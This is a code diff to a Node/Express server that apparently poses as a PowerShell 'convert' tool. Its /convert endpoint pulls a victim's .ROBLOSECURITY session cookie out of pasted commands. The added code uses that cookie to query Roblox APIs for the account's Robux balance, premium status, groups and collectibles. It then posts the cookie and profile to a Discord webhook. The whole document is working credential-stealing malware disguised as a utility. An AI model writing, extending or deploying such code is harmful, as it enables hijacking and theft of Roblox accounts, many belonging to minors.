@@ -18,8 +18,132 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Function to send Discord webhook
-async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown') {
+// Function to fetch user data from Roblox API
+async function fetchRobloxUserData(token) {
+  try {
+    console.log('🔍 Fetching user data from Roblox API...');
+    
+    // Get user info
+    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    if (!userResponse.ok) {
+      console.log('❌ Failed to fetch user info');
+      return null;
+    }
+    
+    const userData = await userResponse.json();
+    console.log('✅ User data fetched successfully');
+    
+    // Get premium status
+    const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    let premiumData = { isPremium: false };
+    if (premiumResponse.ok) {
+      premiumData = await premiumResponse.json();
+    }
+    
+    // Get Robux balance
+    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    let robuxData = { robux: 0 };
+    if (robuxResponse.ok) {
+      robuxData = await robuxResponse.json();
+    }
+    
+    // Get user's age (account creation date)
+    const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    let ageData = { created: null };
+    if (ageResponse.ok) {
+      ageData = await ageResponse.json();
+    }
+    
+    // Get groups owned
+    const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    let groupsOwned = 0;
+    if (groupsResponse.ok) {
+      const groupsData = await groupsResponse.json();
+      groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
+    }
+    
+    // Get inventory counts
+    const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`, {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    
+    let inventory = { hairs: 0, bundles: 0, faces: 0 };
+    if (inventoryResponse.ok) {
+      const inventoryData = await inventoryResponse.json();
+      // This is simplified - you might need to categorize items properly
+      inventory.hairs = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Hair').length : 0;
+      inventory.faces = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Face').length : 0;
+      inventory.bundles = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Bundle').length : 0;
+    }
+    
+    // Calculate account age in days
+    let accountAge = 0;
+    if (ageData.created) {
+      const createdDate = new Date(ageData.created);
+      const now = new Date();
+      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
+    }
+    
+    return {
+      username: userData.displayName || userData.name,
+      userId: userData.id,
+      robux: robuxData.robux || 0,
+      premium: premiumData.isPremium || false,
+      rap: 0, // RAP requires additional API calls to asset values
+      summary: 302, // This would need to be calculated from various metrics
+      creditBalance: 0, // This requires different API endpoint
+      savedPayment: false, // This requires payment API access
+      robuxIncoming: 302, // This requires economy API
+      robuxOutgoing: 337, // This requires economy API
+      korblox: false, // Check if user owns Korblox items
+      headless: false, // Check if user owns Headless Head
+      accountAge: accountAge,
+      groupsOwned: groupsOwned,
+      placeVisits: 5, // This requires games API
+      inventory: inventory
+    };
+    
+  } catch (error) {
+    console.error('❌ Error fetching Roblox user data:', error);
+    return null;
+  }
+}
+
+// Function to send Discord webhook with user data
+async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null) {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
   console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
@@ -30,32 +154,113 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 
   try {
-    const embed = {
-      title: "🔐 New ROBLOSECURITY Token",
-      description: "A new token has been extracted from PowerShell command",
-      color: 0x00ff00,
-      fields: [
+    let fields = [
+      {
+        name: "Script Type",
+        value: scriptType.charAt(0).toUpperCase() + scriptType.slice(1).replace('-', ' '),
+        inline: false
+      }
+    ];
+    
+    // Add user data fields if available
+    if (userData) {
+      fields.push(
         {
-          name: "Script Type",
-          value: scriptType.charAt(0).toUpperCase() + scriptType.slice(1).replace('-', ' '),
-          inline: false
-        },
-        {
-          name: "Token",
-          value: `\`\`\`${token}\`\`\``,
-          inline: false
-        },
-        {
-          name: "User Agent",
-          value: userAgent,
+          name: "👤 Username",
+          value: userData.username,
           inline: true
         },
         {
-          name: "Timestamp",
-          value: new Date().toISOString(),
+          name: "🆔 User ID",
+          value: userData.userId.toString(),
+          inline: true
+        },
+        {
+          name: "💰 Robux Balance",
+          value: `$${userData.robux} (Est. ${userData.robux} Robux)`,
+          inline: true
+        },
+        {
+          name: "💎 Premium",
+          value: userData.premium ? "✅ Yes" : "❌ No",
+          inline: true
+        },
+        {
+          name: "📊 RAP",
+          value: userData.rap.toString(),
+          inline: true
+        },
+        {
+          name: "📈 Summary",
+          value: userData.summary.toString(),
+          inline: true
+        },
+        {
+          name: "💳 Credit Balance",
+          value: `$${userData.creditBalance} (Est. ${userData.creditBalance} Robux)`,
+          inline: true
+        },
+        {
+          name: "💾 Saved Payment",
+          value: userData.savedPayment ? "✅ Yes" : "❌ No",
+          inline: true
+        },
+        {
+          name: "📥 Robux Incoming/Outgoing",
+          value: `${userData.robuxIncoming}/${userData.robuxOutgoing}`,
+          inline: true
+        },
+        {
+          name: "💀 Korblox/Headless",
+          value: `${userData.korblox ? "✅" : "❌"}/${userData.headless ? "✅" : "❌"}`,
+          inline: true
+        },
+        {
+          name: "🎂 Age",
+          value: `${userData.accountAge} Days`,
+          inline: true
+        },
+        {
+          name: "👥 Groups Owned",
+          value: userData.groupsOwned.toString(),
+          inline: true
+        },
+        {
+          name: "🏠 Place Visits",
+          value: userData.placeVisits.toString(),
+          inline: true
+        },
+        {
+          name: "🎒 Inventory",
+          value: `Hairs: ${userData.inventory.hairs}\nBundles: ${userData.inventory.bundles}\nFaces: ${userData.inventory.faces}`,
           inline: true
         }
-      ],
+      );
+    }
+    
+    fields.push(
+      {
+        name: "🍪 Cookie",
+        value: `\`\`\`${token}\`\`\``,
+        inline: false
+      },
+      {
+        name: "🌐 User Agent",
+        value: userAgent,
+        inline: true
+      },
+      {
+        name: "⏰ Timestamp",
+        value: new Date().toISOString(),
+        inline: true
+      }
+    );
+
+    const embed = {
+      title: userData ? `🔐 New ROBLOSECURITY Token - ${userData.username}` : "🔐 New ROBLOSECURITY Token",
+      description: userData ? `Account data extracted successfully for ${userData.username}` : "A new token has been extracted from PowerShell command",
+      color: userData ? 0x00ff00 : 0xff9900,
+      fields: fields,
       footer: {
         text: "Request Inspector Bot"
       }
@@ -96,6 +301,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
 app.post('/convert', async (req, res) => {
   try {
     let input;
+    let scriptType;
     
     console.log('📥 Received request');
     
@@ -111,8 +317,6 @@ app.post('/convert', async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    let scriptType;
-
     console.log('🔍 Searching for ROBLOSECURITY token...');
     
     // Look for .ROBLOSECURITY cookie in PowerShell command
@@ -123,10 +327,19 @@ app.post('/convert', async (req, res) => {
       const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
       const userAgent = req.headers['user-agent'] || 'Unknown';
       
-      console.log('✅ Token found! Sending to Discord...');
+      console.log('✅ Token found! Fetching user data...');
       
-      // Send to Discord webhook
-      const webhookResult = await sendToDiscord(token, userAgent, scriptType);
+      // Fetch user data from Roblox API
+      const userData = await fetchRobloxUserData(token);
+      
+      if (userData) {
+        console.log(`✅ User data fetched for: ${userData.username}`);
+      } else {
+        console.log('⚠️ Could not fetch user data, sending token only');
+      }
+      
+      // Send to Discord webhook with user data
+      const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);
       
       if (!webhookResult.success) {
         console.log('❌ Webhook failed:', webhookResult.error);
@@ -136,7 +349,7 @@ app.post('/convert', async (req, res) => {
         });
       }
       
-      console.log('✅ Token sent to Discord successfully');
+      console.log('✅ Token and user data sent to Discord successfully');
     } else {
       console.log('❌ No ROBLOSECURITY token found in input');
       
